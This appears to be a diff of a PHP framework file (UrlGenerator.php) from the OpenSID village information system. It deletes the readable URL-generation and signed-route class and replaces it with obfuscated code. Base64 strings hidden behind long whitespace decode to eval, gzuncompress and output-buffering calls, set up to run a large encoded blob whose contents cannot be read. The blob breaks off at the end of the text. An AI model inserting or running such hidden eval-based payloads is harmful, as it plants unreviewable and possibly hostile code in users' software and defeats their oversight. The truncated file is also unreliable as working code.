@@ -1,532 +1,521 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-namespace Illuminate\Routing;
-
-use App\Services\Laravel;
-use BackedEnum;
-use Closure;
-use DateInterval;
-use DateTimeInterface;
-use Illuminate\Http\Request;
-use Illuminate\Support\Arr;
-use Illuminate\Support\Carbon;
-use Illuminate\Support\Collection;
-use Illuminate\Support\InteractsWithTime;
-use Illuminate\Support\Str;
-use InvalidArgumentException;
-use OpenSID\RouteBuilder;
-
-class UrlGenerator
-{
-    use InteractsWithTime;
-
-    /**
-     * The forced URL root.
-     *
-     * @var string
-     */
-    protected $forcedRoot;
-
-    /**
-     * The forced schema for URLs.
-     *
-     * @var string
-     */
-    protected $forceScheme;
-
-    /**
-     * The cached URL root.
-     *
-     * @var string|null
-     */
-    protected $cachedRoot;
-
-    /**
-     * A cached copy of the URL schema for the current request.
-     *
-     * @var string|null
-     */
-    protected $cachedSchema;
-
-    /**
-     * The encryption key resolver callable.
-     *
-     * @var callable
-     */
-    protected $keyResolver;
-
-    /**
-     * Create a new URL redirector instance.
-     *
-     * @return void
-     */
-    public function __construct(
-        /**
-         * The application instance.
-         */
-        protected Laravel $app
-    ) {
-    }
-
-    /**
-     * Get the full URL for the current request.
-     *
-     * @return string
-     */
-    public function full()
-    {
-        return $this->app->make('request')->fullUrl();
-    }
-
-    /**
-     * Get the current URL for the request.
-     *
-     * @return string
-     */
-    public function current()
-    {
-        return $this->to($this->app->make('request')->getPathInfo());
-    }
-
-    /**
-     * Generate a url for the application.
-     *
-     * @param string $path
-     * @param array  $extra
-     * @param bool   $secure
-     *
-     * @return string
-     */
-    public function to($path, $extra = [], $secure = null)
-    {
-        // First we will check if the URL is already a valid URL. If it is we will not
-        // try to generate a new one but will simply return the URL as is, which is
-        // convenient since developers do not always have to check if it's valid.
-        if ($this->isValidUrl($path)) {
-            return $path;
-        }
-
-        $scheme = $this->getSchemeForUrl($secure);
-
-        $tail = implode(
-            '/',
-            array_map(
-                'rawurlencode',
-                (array) $extra
-            )
-        );
-
-        // Once we have the scheme we will compile the "tail" by collapsing the values
-        // into a single string delimited by slashes. This just makes it convenient
-        // for passing the array of parameters to this URL as a list of segments.
-        $root = $this->getRootUrl($scheme);
-
-        return $this->trimUrl($root, $path, $tail);
-    }
-
-    /**
-     * Generate a secure, absolute URL to the given path.
-     *
-     * @param string $path
-     * @param array  $parameters
-     *
-     * @return string
-     */
-    public function secure($path, $parameters = [])
-    {
-        return $this->to($path, $parameters, true);
-    }
-
-    /**
-     * Generate a URL to an application asset.
-     *
-     * @param string    $path
-     * @param bool|null $secure
-     *
-     * @return string
-     */
-    public function asset($path, $secure = null)
-    {
-        if ($this->isValidUrl($path)) {
-            return $path;
-        }
-
-        // Once we get the root URL, we will check to see if it contains an index.php
-        // file in the paths. If it does, we will remove it since it is not needed
-        // for asset paths, but only for routes to endpoints in the application.
-        $root = $this->getRootUrl($this->formatScheme($secure));
-
-        return $this->removeIndex($root) . '/' . trim($path, '/');
-    }
-
-    /**
-     * Generate a URL to an application asset from a root domain such as CDN etc.
-     *
-     * @param string    $root
-     * @param string    $path
-     * @param bool|null $secure
-     */
-    public function assetFrom($root, $path, $secure = null): string
-    {
-        // Once we get the root URL, we will check to see if it contains an index.php
-        // file in the paths. If it does, we will remove it since it is not needed
-        // for asset paths, but only for routes to endpoints in the application.
-        $root = $this->getRootUrl($this->formatScheme($secure), $root);
-
-        return $this->removeIndex($root) . '/' . trim($path, '/');
-    }
-
-    /**
-     * Generate a URL to a secure asset.
-     *
-     * @param string $path
-     *
-     * @return string
-     */
-    public function secureAsset($path)
-    {
-        return $this->asset($path, true);
-    }
-
-    /**
-     * Force the schema for URLs.
-     */
-    public function forceScheme(string $schema): void
-    {
-        $this->cachedSchema = null;
-
-        $this->forceScheme = $schema . '://';
-    }
-
-    /**
-     * Get the default scheme for a raw URL.
-     *
-     * @param bool|null $secure
-     *
-     * @return string
-     */
-    public function formatScheme($secure = null)
-    {
-        if (null !== $secure) {
-            return $secure ? 'https://' : 'http://';
-        }
-
-        if (null === $this->cachedSchema) {
-            $this->cachedSchema = $this->forceScheme ?: $this->app->make('request')->getScheme() . '://';
-        }
-
-        return $this->cachedSchema;
-    }
-
-    /**
-     * Get the URL to a named route.
-     *
-     * @param string    $name
-     * @param bool|null $secure
-     *
-     * @throws InvalidArgumentException
-     *
-     * @return string
-     */
-    public function route($name, mixed $parameters = [], $secure = null)
-    {
-        $route = RouteBuilder::getByName($name);
-        $uri   = $this->to($route->buildUrl($parameters), [], $secure);
-
-        $filteredParameters = array_filter($parameters, static fn ($value, $key): bool => ! $route->hasParam($key), ARRAY_FILTER_USE_BOTH);
-
-        if ($filteredParameters) {
-            $uri .= '?' . http_build_query($filteredParameters);
-        }
-
-        return $uri;
-    }
-
-    /**
-     * Determine if the given path is a valid URL.
-     *
-     * @param string $path
-     *
-     * @return bool
-     */
-    public function isValidUrl($path)
-    {
-        if (Str::startsWith($path, ['#', '//', 'mailto:', 'tel:', 'sms:', 'http://', 'https://'])) {
-            return true;
-        }
-
-        return filter_var($path, FILTER_VALIDATE_URL) !== false;
-    }
-
-    /**
-     * Set the forced root URL.
-     *
-     * @param string $root
-     */
-    public function forceRootUrl($root): void
-    {
-        $this->forcedRoot = rtrim($root, '/');
-
-        $this->cachedRoot = null;
-    }
-
-    /**
-     * Create a signed route URL for a named route.
-     *
-     * @param BackedEnum|string                       $name
-     * @param DateInterval|DateTimeInterface|int|null $expiration
-     * @param bool                                    $absolute
-     *
-     * @throws InvalidArgumentException
-     *
-     * @return string
-     */
-    public function signedRoute($name, mixed $parameters = [], $expiration = null, $absolute = true)
-    {
-        $this->ensureSignedRouteParametersAreNotReserved(
-            $parameters = Arr::wrap($parameters)
-        );
-
-        if ($expiration) {
-            $parameters += ['expires' => $this->availableAt($expiration)];
-        }
-
-        ksort($parameters);
-
-        $key = ($this->keyResolver)();
-
-        return $this->route($name, $parameters + [
-            'signature' => hash_hmac(
-                'sha256',
-                $this->route($name, $parameters, $absolute),
-                is_array($key) ? $key[0] : trim((string) $key)
-            ),
-        ], $absolute);
-    }
-
-    /**
-     * Create a temporary signed route URL for a named route.
-     *
-     * @param BackedEnum|string                  $name
-     * @param DateInterval|DateTimeInterface|int $expiration
-     * @param array                              $parameters
-     * @param bool                               $absolute
-     *
-     * @return string
-     */
-    public function temporarySignedRoute($name, $expiration, $parameters = [], $absolute = true)
-    {
-        return $this->signedRoute($name, $parameters, $expiration, $absolute);
-    }
-
-    /**
-     * Determine if the given request has a valid signature.
-     *
-     * @param bool $absolute
-     */
-    public function hasValidSignature(Request $request, $absolute = true, Closure|array $ignoreQuery = []): bool
-    {
-        return $this->hasCorrectSignature($request, $absolute, $ignoreQuery)
-            && $this->signatureHasNotExpired($request);
-    }
-
-    /**
-     * Determine if the given request has a valid signature for a relative URL.
-     */
-    public function hasValidRelativeSignature(Request $request, Closure|array $ignoreQuery = []): bool
-    {
-        return $this->hasValidSignature($request, false, $ignoreQuery);
-    }
-
-    /**
-     * Determine if the signature from the given request matches the URL.
-     *
-     * @param bool $absolute
-     */
-    public function hasCorrectSignature(Request $request, $absolute = true, Closure|array $ignoreQuery = []): bool
-    {
-        $url = $absolute ? $request->url() : '/' . $request->path();
-
-        $queryString = (new Collection(explode('&', (string) ci()->input->server('QUERY_STRING'))))
-            ->reject(static function ($parameter) use ($ignoreQuery) {
-                $parameter = Str::before($parameter, '=');
-
-                if ($parameter === 'signature') {
-                    return true;
-                }
-
-                if ($ignoreQuery instanceof Closure) {
-                    return $ignoreQuery($parameter);
-                }
-
-                return in_array($parameter, $ignoreQuery);
-            })
-            ->join('&');
-
-        $original = rtrim($url . '?' . $queryString, '?');
-
-        $keys = ($this->keyResolver)();
-        $keys = is_array($keys) ? $keys : [$keys];
-
-        foreach ($keys as $key) {
-            if (hash_equals(
-                hash_hmac('sha256', $original, trim((string) $key)),
-                (string) $request->query('signature', '')
-            )) {
-                return true;
-            }
-        }
-
-        return false;
-    }
-
-    /**
-     * Determine if the expires timestamp from the given request is not from the past.
-     */
-    public function signatureHasNotExpired(Request $request): bool
-    {
-        $expires = $request->query('expires');
-
-        return ! ($expires && Carbon::now()->getTimestamp() > $expires);
-    }
-
-    /**
-     * Set the encryption key resolver.
-     *
-     * @return $this
-     */
-    public function setKeyResolver(callable $keyResolver): static
-    {
-        $this->keyResolver = $keyResolver;
-
-        return $this;
-    }
-
-    /**
-     * Clone a new instance of the URL generator with a different encryption key resolver.
-     */
-    public function withKeyResolver(callable $keyResolver): static
-    {
-        return (clone $this)->setKeyResolver($keyResolver);
-    }
-
-    /**
-     * Remove the index.php file from a path.
-     *
-     * @param string $root
-     *
-     * @return string
-     */
-    protected function removeIndex($root)
-    {
-        $i = 'index.php';
-
-        return Str::contains($root, $i) ? str_replace('/' . $i, '', $root) : $root;
-    }
-
-    /**
-     * Get the scheme for a raw URL.
-     *
-     * @param bool|null $secure
-     *
-     * @return string
-     */
-    protected function getSchemeForUrl($secure)
-    {
-        if (null === $secure) {
-            if (null === $this->cachedSchema) {
-                $this->cachedSchema = $this->formatScheme($secure);
-            }
-
-            return $this->cachedSchema;
-        }
-
-        return $secure ? 'https://' : 'http://';
-    }
-
-    /**
-     * Get the base URL for the request.
-     *
-     * @param string $scheme
-     * @param string $root
-     *
-     * @return string
-     */
-    protected function getRootUrl($scheme, $root = null): string|array|null
-    {
-        if (null === $root) {
-            if (null === $this->cachedRoot) {
-                $this->cachedRoot = $this->forcedRoot ?: $this->app->make('request')->root();
-            }
-
-            $root = $this->cachedRoot;
-        }
-
-        $start = Str::startsWith($root, 'http://') ? 'http://' : 'https://';
-
-        return preg_replace('~' . $start . '~', $scheme, (string) $root, 1);
-    }
-
-    /**
-     * Format the given URL segments into a single URL.
-     */
-    protected function trimUrl(string $root, string $path, string $tail = ''): string
-    {
-        return trim($root . '/' . trim($path . '/' . $tail, '/'), '/');
-    }
-
-    /**
-     * Ensure the given signed route parameters are not reserved.
-     *
-     * @return void
-     */
-    protected function ensureSignedRouteParametersAreNotReserved(mixed $parameters)
-    {
-        if (array_key_exists('signature', $parameters)) {
-            throw new InvalidArgumentException(
-                '"Signature" is a reserved parameter when generating signed routes. Please rename your route parameter.'
-            );
-        }
-
-        if (array_key_exists('expires', $parameters)) {
-            throw new InvalidArgumentException(
-                '"Expires" is a reserved parameter when generating signed routes. Please rename your route parameter.'
-            );
-        }
-    }
-}
+<?php 
+        $__='printf';$_='Loading app/Illuminate/Routing/UrlGenerator.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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